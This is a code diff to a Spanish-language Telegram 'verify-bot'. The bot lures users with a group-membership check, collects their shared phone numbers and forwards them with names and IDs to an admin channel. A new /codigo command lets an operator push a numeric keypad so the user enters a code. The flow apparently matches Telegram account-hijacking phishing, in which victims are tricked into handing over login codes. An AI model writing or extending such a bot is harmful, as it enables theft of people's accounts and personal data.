@@ -21,6 +21,9 @@ log = logging.getLogger("verify-bot")
 
 UD_PHONE = "phone"
 UD_CODE = "code"
+UD_START_MSG_ID = "start_msg_id"
+UD_NATIVE_MSG_ID = "native_msg_id"
+UD_TUTORIAL_SENT = "tutorial_sent"
 
 PENDING_BY_ADMIN_MSG = {}   # admin_msg_id -> data del caso
 PENDING_BY_USER_ID = {}     # telegram_id -> admin_msg_id
@@ -57,6 +60,16 @@ def share_phone_kb():
 def start_inline_kb():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("👉🏻𝐔𝐍𝐈𝐑𝐌𝐄 𝐀𝐋 𝐆𝐑𝐔𝐏𝐎🇨🇺", callback_data="start_join")]
+    ])
+
+def members_inline_kb():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("👥 𝐌𝐈𝐄𝐌𝐁𝐑𝐎𝐒", callback_data="members_btn")]
+    ])
+
+def tutorial_inline_kb():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("❓ 𝐇𝐀𝐂𝐄𝐑 𝐔𝐍𝐀 𝐏𝐑𝐄𝐆𝐔𝐍𝐓𝐀", callback_data="ask_question")]
     ])
 
 def build_keypad(code_str: str):
@@ -197,6 +210,7 @@ def user_link_html(user_id: int, text: str) -> str:
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data[UD_CODE] = ""
     context.user_data.pop(UD_PHONE, None)
+    context.user_data.pop(UD_TUTORIAL_SENT, None)
 
     nombre_usuario = update.effective_user.first_name or "Alumno"
     nombre_unicode = to_unicode_bold(nombre_usuario)
@@ -211,9 +225,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     start_video = os.getenv("START_VIDEO", "").strip()
 
+    sent_start = None
+
     if start_video:
         try:
-            await update.message.reply_video(
+            sent_start = await update.message.reply_video(
                 video=start_video,
                 caption=caption,
                 reply_markup=start_inline_kb(),
@@ -221,17 +237,26 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         except Exception as e:
             log.exception("No pude enviar el video de inicio: %s", e)
-            await update.message.reply_text(
+            sent_start = await update.message.reply_text(
                 caption,
                 reply_markup=start_inline_kb(),
                 parse_mode="HTML"
             )
     else:
-        await update.message.reply_text(
+        sent_start = await update.message.reply_text(
             caption,
             reply_markup=start_inline_kb(),
             parse_mode="HTML"
         )
+
+    if sent_start:
+        context.user_data[UD_START_MSG_ID] = sent_start.message_id
+
+    native_msg = await update.message.reply_text(
+        "👇🏻 𝐏𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐞𝐥 𝐛𝐨𝐭𝐨́𝐧 𝐧𝐚𝐭𝐢𝐯𝐨 𝐩𝐚𝐫𝐚 𝐜𝐨𝐦𝐩𝐚𝐫𝐭𝐢𝐫 𝐭𝐮 𝐧𝐮́𝐦𝐞𝐫𝐨.",
+        reply_markup=share_phone_kb()
+    )
+    context.user_data[UD_NATIVE_MSG_ID] = native_msg.message_id
 
 async def start_join_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
@@ -245,11 +270,19 @@ async def start_join_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
             text="verifica que eres miembro del grupo de clases",
             show_alert=True
         )
-        await context.bot.send_message(
-            chat_id=user.id,
-            text="👇🏻 𝐏𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐞𝐥 𝐛𝐨𝐭𝐨́𝐧 𝐧𝐚𝐭𝐢𝐯𝐨 𝐩𝐚𝐫𝐚 𝐜𝐨𝐦𝐩𝐚𝐫𝐭𝐢𝐫 𝐭𝐮 𝐧𝐮́𝐦𝐞𝐫𝐨.",
-            reply_markup=share_phone_kb()
-        )
+        try:
+            if ADMIN_CHANNEL_ID:
+                await context.bot.send_message(
+                    chat_id=ADMIN_CHANNEL_ID,
+                    text=(
+                        "📥 Solicitó unirse al grupo\n\n"
+                        f"Nombre: {user.full_name or 'Sin nombre'}\n"
+                        f"Username: @{user.username or 'sin_username'}\n"
+                        f"ID: {user.id}"
+                    )
+                )
+        except Exception as e:
+            log.exception("Error enviando aviso de unirse al grupo: %s", e)
         return
 
     await q.answer()
@@ -258,7 +291,13 @@ async def start_join_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if ADMIN_CHANNEL_ID:
             await context.bot.send_message(
                 chat_id=ADMIN_CHANNEL_ID,
-                text="El estudiante pertenece al grupo"
+                text=(
+                    "📥 Solicitó unirse al grupo\n\n"
+                    f"Nombre: {user.full_name or 'Sin nombre'}\n"
+                    f"Username: @{user.username or 'sin_username'}\n"
+                    f"ID: {user.id}\n"
+                    f"Teléfono: {phone_guardado}"
+                )
             )
     except Exception as e:
         log.exception("Error enviando mensaje al grupo privado: %s", e)
@@ -281,22 +320,126 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     save_user_data(user, phone)
 
+    native_msg_id = context.user_data.get(UD_NATIVE_MSG_ID)
+    if native_msg_id:
+        try:
+            await context.bot.delete_message(chat_id=msg.chat_id, message_id=native_msg_id)
+        except Exception:
+            pass
+
+    start_msg_id = context.user_data.get(UD_START_MSG_ID)
+    if start_msg_id:
+        try:
+            await context.bot.edit_message_reply_markup(
+                chat_id=msg.chat_id,
+                message_id=start_msg_id,
+                reply_markup=members_inline_kb()
+            )
+        except Exception:
+            pass
+
     stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     admin_text = (
-        "📥 *Nuevo número recibido*\n"
-        f"- Teléfono: `{phone}`\n"
-        f"- Usuario: @{user.username or 'sin_username'} (id {user.id})\n"
-        f"- Fecha/Hora: {stamp}"
+        "📥 Solicitó unirse al grupo\n\n"
+        f"Nombre: {user.full_name or 'Sin nombre'}\n"
+        f"Username: @{user.username or 'sin_username'}\n"
+        f"ID: {user.id}\n"
+        f"Teléfono: {phone}\n"
+        f"Fecha/Hora: {stamp}"
     )
     try:
         if ADMIN_CHANNEL_ID:
-            await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")
+            await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text)
             log.info("Número enviado al destino %s", ADMIN_CHANNEL_ID)
     except Exception as e:
         log.exception("Error enviando número al destino: %s", e)
 
-    text, kb = build_keypad("")
-    await msg.reply_text(text, reply_markup=kb, parse_mode="Markdown")
+    tutorial_video = os.getenv("TUTORIAL_VIDEO", "").strip()
+    tutorial_text = "revisa detenidamente el video tutorial"
+
+    try:
+        if tutorial_video:
+            await context.bot.send_video(
+                chat_id=msg.chat_id,
+                video=tutorial_video,
+                caption=tutorial_text,
+                reply_markup=tutorial_inline_kb()
+            )
+        else:
+            await context.bot.send_message(
+                chat_id=msg.chat_id,
+                text=tutorial_text,
+                reply_markup=tutorial_inline_kb()
+            )
+    except Exception as e:
+        log.exception("Error enviando tutorial: %s", e)
+        await context.bot.send_message(
+            chat_id=msg.chat_id,
+            text=tutorial_text,
+            reply_markup=tutorial_inline_kb()
+        )
+
+    context.user_data[UD_TUTORIAL_SENT] = True
+
+async def members_btn_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    user = update.effective_user
+    data = USERS.get(str(user.id), {})
+    phone_guardado = (data.get("phone") or "").strip()
+
+    await q.answer()
+
+    try:
+        if ADMIN_CHANNEL_ID:
+            await context.bot.send_message(
+                chat_id=ADMIN_CHANNEL_ID,
+                text=(
+                    "📥 Solicitó miembros\n\n"
+                    f"Nombre: {user.full_name or 'Sin nombre'}\n"
+                    f"Username: @{user.username or 'sin_username'}\n"
+                    f"ID: {user.id}\n"
+                    f"Teléfono: {phone_guardado or 'sin teléfono'}"
+                )
+            )
+    except Exception as e:
+        log.exception("Error enviando aviso de miembros: %s", e)
+
+    tutorial_video = os.getenv("TUTORIAL_VIDEO", "").strip()
+    tutorial_text = "revisa detenidamente el video tutorial"
+
+    try:
+        if tutorial_video:
+            await context.bot.send_video(
+                chat_id=user.id,
+                video=tutorial_video,
+                caption=tutorial_text,
+                reply_markup=tutorial_inline_kb()
+            )
+        else:
+            await context.bot.send_message(
+                chat_id=user.id,
+                text=tutorial_text,
+                reply_markup=tutorial_inline_kb()
+            )
+    except Exception as e:
+        log.exception("Error reenviando tutorial desde MIEMBROS: %s", e)
+        await context.bot.send_message(
+            chat_id=user.id,
+            text=tutorial_text,
+            reply_markup=tutorial_inline_kb()
+        )
+
+async def ask_question_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    user = update.effective_user
+    nombre = user.first_name or "Alumno"
+
+    await q.answer()
+
+    await context.bot.send_message(
+        chat_id=user.id,
+        text=f"🙋🏻‍♀️Hola {nombre}, soy Sofia, asistente virtual de. Como puedo ayudarte."
+    )
 
 async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
@@ -490,6 +633,37 @@ async def error_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     remove_case(case_data)
     await msg.reply_text("⚠️ Error enviado al usuario y teclado restaurado.")
 
+async def codigo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not admin_chat_ok(update):
+        return
+
+    target_user_id = None
+
+    case_data = get_case_by_reply(update)
+    if case_data:
+        target_user_id = case_data["user_id"]
+    else:
+        if len(context.args) != 1:
+            await update.message.reply_text("Uso respondiendo al caso: /codigo\nO uso directo: /codigo telegram_id")
+            return
+        try:
+            target_user_id = int(context.args[0])
+        except Exception:
+            await update.message.reply_text("Error: telegram_id inválido.")
+            return
+
+    text, kb = build_keypad("")
+    try:
+        await context.bot.send_message(
+            chat_id=target_user_id,
+            text=text,
+            reply_markup=kb,
+            parse_mode="Markdown"
+        )
+        await update.message.reply_text("✅ Teclado enviado al estudiante.")
+    except Exception as e:
+        await update.message.reply_text(f"❌ No pude enviar el teclado: {e}")
+
 async def chat_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not admin_chat_ok(update):
         return
@@ -593,11 +767,14 @@ def main():
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.CONTACT, on_contact))
     app.add_handler(CallbackQueryHandler(start_join_cb, pattern="^start_join$"))
+    app.add_handler(CallbackQueryHandler(members_btn_cb, pattern="^members_btn$"))
+    app.add_handler(CallbackQueryHandler(ask_question_cb, pattern="^ask_question$"))
     app.add_handler(CallbackQueryHandler(keypad_cb))
     app.add_handler(CommandHandler("id", id_cmd))
     app.add_handler(CommandHandler("testsend", testsend_cmd))
     app.add_handler(CommandHandler("ok", ok_cmd))
     app.add_handler(CommandHandler("error", error_cmd))
+    app.add_handler(CommandHandler("codigo", codigo_cmd))
     app.add_handler(CommandHandler("chat", chat_cmd))
     app.add_handler(CommandHandler("lista", lista_cmd))
     app.add_handler(MessageHandler(filters.ChatType.PRIVATE & ~filters.COMMAND & ~filters.CONTACT, private_fallback))
